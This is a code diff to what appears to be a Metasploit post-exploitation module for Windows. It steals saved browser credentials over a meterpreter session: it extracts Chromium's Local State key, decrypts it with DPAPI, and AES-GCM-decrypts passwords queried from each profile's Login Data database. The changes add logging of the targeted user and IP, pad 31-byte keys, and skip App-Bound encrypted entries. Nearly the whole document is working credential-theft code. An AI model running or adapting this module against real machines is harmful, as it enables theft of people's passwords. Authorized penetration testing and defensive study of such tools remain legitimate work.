@@ -40,21 +40,26 @@ class MetasploitModule < Msf::Post
 
   def run
     if session.type != 'meterpreter'
-      print_error('This module requires a meterpreter session')
+      print_error('This module requires a meterpreter session.')
       return
     end
-
+  
     user_profile = get_env('USERPROFILE')
+    user_account = session.sys.config.getuid
+    ip_address = session.sock.peerhost
+  
     if user_profile.nil? || user_profile.empty?
-      print_error('Could not determine the current user profile directory')
+      print_error('Could not determine the current user profile directory.')
       return
     end
-
-    print_status("Current user profile: #{user_profile}")
-
+  
+    print_status("Targeting: #{user_account} (#{ip_address}).")
+    print_status("Starting data extraction from user profile: #{user_profile}")
+  
     process_chromium_browsers(user_profile)
     process_gecko_browsers(user_profile)
   end
+  
 
   # Browsers and paths taken from https://github.com/shaddy43/BrowserSnatch/
   def process_chromium_browsers(base_path)
@@ -149,11 +154,11 @@ class MetasploitModule < Msf::Post
   end
 
   def decrypt_data(encrypted_data)
-    print_status('Starting DPAPI decryption process') if datastore['VERBOSE']
+    print_status('Starting DPAPI decryption process.') if datastore['VERBOSE']
 
     begin
       mem = session.railgun.kernel32.LocalAlloc(0, encrypted_data.length)['return']
-      raise 'Memory allocation failed' if mem == 0
+      raise 'Memory allocation failed.' if mem == 0
 
       session.railgun.memwrite(mem, encrypted_data)
 
@@ -177,7 +182,7 @@ class MetasploitModule < Msf::Post
       session.railgun.kernel32.LocalFree(mem)
       session.railgun.kernel32.LocalFree(addr) if addr != 0
 
-      print_good('Decryption successful') if datastore['VERBOSE']
+      print_good('Decryption successful.') if datastore['VERBOSE']
       return decrypted_data.strip
     rescue StandardError => e
       print_error("Error during DPAPI decryption: #{e.message}")
@@ -187,7 +192,7 @@ class MetasploitModule < Msf::Post
 
   def get_encryption_key(local_state_path)
     print_status("Getting encryption key from: #{local_state_path}") if datastore['VERBOSE']
-
+  
     if file?(local_state_path)
       local_state = read_file(local_state_path)
       json_state = begin
@@ -195,12 +200,12 @@ class MetasploitModule < Msf::Post
       rescue StandardError
         nil
       end
-
+  
       if json_state.nil?
-        print_error('Failed to parse JSON from Local State file')
+        print_error('Failed to parse JSON from Local State file.')
         return nil
       end
-
+  
       if json_state['os_crypt'] && json_state['os_crypt']['encrypted_key']
         encrypted_key = json_state['os_crypt']['encrypted_key']
         encrypted_key_bin = begin
@@ -208,64 +213,79 @@ class MetasploitModule < Msf::Post
         rescue StandardError
           nil
         end
-
+  
         if encrypted_key_bin.nil?
-          print_error('Failed to Base64 decode the encrypted key')
+          print_error('Failed to Base64 decode the encrypted key.')
           return nil
         end
-
+  
         print_status("Encrypted key (Base64-decoded, hex): #{encrypted_key_bin.unpack('H*').first}") if datastore['VERBOSE']
+        
         decrypted_key = decrypt_data(encrypted_key_bin)
-
-        if decrypted_key
-          print_good("Decrypted key (hex): #{decrypted_key.unpack('H*').first}") if datastore['VERBOSE']
-          return decrypted_key
-        else
-          print_error('Failed to decrypt the encryption key.')
-          return nil
+  
+        if decrypted_key.nil? || decrypted_key.length != 32
+          print_error("Decrypted key is not 32 bytes: #{decrypted_key.nil? ? 'nil' : decrypted_key.length} bytes") if datastore['VERBOSE']
+          
+          if decrypted_key.length == 31
+            print_status('Decrypted key is 31 bytes, attempting to pad key for decryption.') if datastore['VERBOSE']
+            decrypted_key += "\x00"
+          else
+            return nil
+          end
         end
+  
+        print_good("Decrypted key (hex): #{decrypted_key.unpack('H*').first}") if datastore['VERBOSE']
+        return decrypted_key
       else
-        print_error('os_crypt or encrypted_key not found in Local State')
+        print_error('os_crypt or encrypted_key not found in Local State.')
         return nil
       end
     else
       print_error("Local State file not found at: #{local_state_path}")
       return nil
     end
-  end
+  end  
 
   def decrypt_chromium_password(encrypted_password, key)
-    return print_error('Invalid encrypted password length') if encrypted_password.nil? || encrypted_password.length < (IV_SIZE + TAG_SIZE)
-
+    # Check for the "v20" prefix that indicates App-Bound encryption, which can't be decrypted yet.
+    # https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html
+    if encrypted_password[0, 3] == 'v20'
+      print_status('App-Bound encryption detected (v20). Skipping decryption for this entry.') if datastore['VERBOSE']
+      return nil
+    end
+  
+    return print_error('Invalid encrypted password length.') if encrypted_password.nil? || encrypted_password.length < (IV_SIZE + TAG_SIZE)
+  
     iv = encrypted_password[3, IV_SIZE]
     ciphertext = encrypted_password[IV_SIZE + 3...-TAG_SIZE]
     tag = encrypted_password[-TAG_SIZE..]
-
+  
     if iv.nil? || iv.length != IV_SIZE
       print_error("Invalid IV: expected #{IV_SIZE} bytes, got #{iv.nil? ? 'nil' : iv.length} bytes")
       return nil
     end
-
+  
     begin
       aes = OpenSSL::Cipher.new('aes-256-gcm')
       aes.decrypt
       aes.key = key
       aes.iv = iv
       aes.auth_tag = tag
-
+  
       decrypted_password = aes.update(ciphertext) + aes.final
       return decrypted_password
     rescue OpenSSL::Cipher::CipherError => e
-      print_error("Failed to decrypt password: #{e.message}")
+      print_status("Password decryption failed for this entry.") if datastore['VERBOSE']
       return nil
     end
   end
+  
 
   def extract_chromium_data(profile_path, encryption_key, browser)
-    return print_error("Profile path #{profile_path} not found") unless directory?(profile_path)
+    return print_error("Profile path #{profile_path} not found.") unless directory?(profile_path)
 
     login_data_path = "#{profile_path}\\Login Data"
-    return print_error("Login Data not found at #{login_data_path}") unless file?(login_data_path)
+    return print_error("Login Data not found at #{login_data_path}.") unless file?(login_data_path)
 
     extract_sql_data(login_data_path, 'SELECT origin_url, username_value, password_value FROM logins', 'passwords', browser, encryption_key)
 
